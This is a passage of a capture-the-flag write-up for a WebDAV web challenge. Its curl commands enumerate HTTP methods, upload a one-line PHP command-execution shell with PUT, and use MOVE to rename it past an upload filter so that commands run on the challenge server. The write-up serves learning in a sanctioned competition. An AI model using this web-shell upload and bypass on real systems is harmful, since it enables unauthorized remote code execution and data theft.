+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>secret.txt
+</code></pre></div>
+<hr/>
+<h2 id="section-get-the-flag"><a href="#section-get-the-flag" class="heading-link">Get the Flag</a></h2>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">curl <span class="hljs-string">&quot;http://sfide2026.itscybergame.it:10246/webdav/shell.php?cmd=cat+secret_folder/secret.txt&quot;</span> \
+  -u <span class="hljs-string">&quot;user:your_password&quot;</span>
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>flag{W3bD4V_&lt;SNIP&gt;_ftw!}
+</code></pre></div>
+<hr/>
+<h2 id="section-final-notes"><a href="#section-final-notes" class="heading-link">Final Notes</a></h2>
+<ul>
+<li>The hint about “options” was pointing straight at HTTP methods</li>
+<li>WebDAV left enabled + weak filtering = easy win</li>
+<li><code>MOVE</code> bypass is always worth trying when <code>PUT</code> is restricted</li>
+</ul></div><dialog class="reader-image-dialog" aria-label="Enlarged article image"><button type="button" class="reader-image-close" aria-label="Close image"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button></dialog></div></div></div></main></div><!--/$--></div></div><script id="article-data" type="application/json">{"kind":"ctf","entry":{"id":"webdav","title":"WebDAV","competition":"ITS CyberGame","category":"web","difficulty":"medium","points":200,"tags":["WebDAV","RCE"],"date":"2026-03-27","summary":"Discover a WebDAV endpoint via fuzzing and exploit unsafe HTTP methods to bypass file upload restrictions and achieve RCE.","contentPath":"webdav.md","previewImage":"/assets/previews/ctf-webdav.png","kind":"ctf","folder":"ctf","route":"ctf/webdav"},"route":"ctf/webdav","content":"## Description\n\n**ITA:**\n\"Mio cuggino mi ha fatto il nuovo sito per la mia azienda! Bellissimo no? Sempre una persona piena di opzioni.\"\n\n**ENG:**\n\"My cousin made me a new website for my company! It's beautiful, isn't it? Always full of options.\"\n\n---\n## Knowledge\n\nThis challenge revolves around **WebDAV**, an extension of HTTP that allows remote file management.\n\nUseful stuff to know:\n\n* HTTP methods like **OPTIONS**, **PROPFIND**, **PUT**, **MOVE**\n* Tools like `curl` or a WebDAV client such as `cadaver`\n* Some valid credentials (which we’ll get easily)\n\n---\n## Installing cadaver (Optional)\n\nIf you want a nicer way to interact with WebDAV:\n\n```bash\napt-get install cadaver\n```\n\n---\n# Challenge Analysis\n\n## index.html\n\nThe main page is a simple company page with an employee login portal.\n\nA couple of things stand out immediately:\n* There’s an HTML comment saying credentials are basically in the placeholders\n* Username: `user`\n* Password: `your_password`\n* Footer hint mentions “multiple communication options”\n* Server is running Apache + PHP, so executing `.php` files is on the table\n\n---\n\n# Exploitation Path\n\nHigh-level idea:\n1. Grab credentials leaked in the source code\n2. Fuzz for hidden directories (WebDAV)\n3. Abuse WebDAV methods\n4. Upload a shell\n5. Get the flag\n\n---\n## 1. Enumeration\n\nThe login panel didn’t really do anything interesting, so I moved on to fuzzing.\nUsed `ffuf` with `common.txt` and found:\n\n```\n/webdav/\n```\n\nAs soon as I saw that, it was nice since I had seen a similar WebDAV misconfig a few weeks before at work, so I had good feelings that this was probably the right path.\n\n**Check allowed methods**\n\n```bash\ncurl -i -X OPTIONS http://sfide2026.itscybergame.it:10146/webdav/\n```\n\n```http\nHTTP/1.1 200 OK\nServer: Apache/2.4.66 (Debian)\nDAV: 1,2\nAllow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK\n```\n\nSeeing `PUT` and `MOVE` here is already very promising.\n\n---\n## 2. PROPFIND (Directory Listing)\n\nNow that we have creds, we can list files using WebDAV.\n\n```bash\ncurl -i -X PROPFIND http://sfide2026.itscybergame.it:10146/webdav/ \\\n  -u \"user:your_password\" \\\n  -H \"Depth: 1\" \\\n  -H \"Content-Type: application/xml\" \\\n  --data '\u003c?xml version=\"1.0\"?\u003e\u003cd:propfind xmlns:d=\"DAV:\"\u003e\u003cd:allprop/\u003e\u003c/d:propfind\u003e'\n```\n\nResponse shows:\n\n```xml\n\u003cD:href\u003e/webdav/secret_folder/\u003c/D:href\u003e\n```\n\n---\n### Using cadaver (easier way)\n\n```bash\ncadaver http://sfide2026.itscybergame.it:10143/webdav/\n```\n\nLogin with:\n\n```\nuser / your_password\n```\n\nThen list files:\n\n```bash\ndav:/webdav/\u003e ls\n```\n\n```\nsecret_folder\n```\n\n---\n## 3. PUT + MOVE Bypass\n\n\nUploading `.php` directly is blocked, so the strategy is:\n\n* upload as `.txt`\n* rename it later to `.php`\n\n### Upload shell\n\n```bash\ncurl -i -X PUT \"http://sfide2026.itscybergame.it:10246/webdav/shell.txt\" \\\n  -u \"user:your_password\" \\\n  -H \"Content-Type: text/plain\" \\\n  --data \"\u003c?php system(\\$_GET['cmd']); ?\u003e\"\n```\n\n### Rename with MOVE\n\n```bash\ncurl -i -X MOVE \"http://sfide2026.itscybergame.it:10246/webdav/shell.txt\" \\\n  -u \"user:your_password\" \\\n  -H \"Destination: http://sfide2026.itscybergame.it:10246/webdav/shell.php\"\n```\n\nAnd just like that, filter bypassed.\n\n---\n### Same thing with cadaver\n\n```bash\ndav:/webdav/\u003e put shell.txt\ndav:/webdav/\u003e move shell.txt shell.php\n```\n\n---\n## 4. RCE\n\nNow we just use the shell:\n\n```bash\ncurl \"http://sfide2026.itscybergame.it:10246/webdav/shell.php?cmd=ls+secret_folder\" \\\n  -u \"user:your_password\"\n```\n\nOutput:\n\n```\nsecret.txt\n```\n\n---\n# Get the Flag\n\n```bash\ncurl \"http://sfide2026.itscybergame.it:10246/webdav/shell.php?cmd=cat+secret_folder/secret.txt\" \\\n  -u \"user:your_password\"\n```\n\n```\nflag{W3bD4V_\u003cSNIP\u003e_ftw!}\n```\n\n---\n## Final Notes\n\n* The hint about “options” was pointing straight at HTTP methods\n* WebDAV left enabled + weak filtering = easy win\n* `MOVE` bypass is always worth trying when `PUT` is restricted\n\n"}</script>
+    
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "6090182987b5451bb264dcd59cd2b600"}'></script>
+  </body>
+</html>
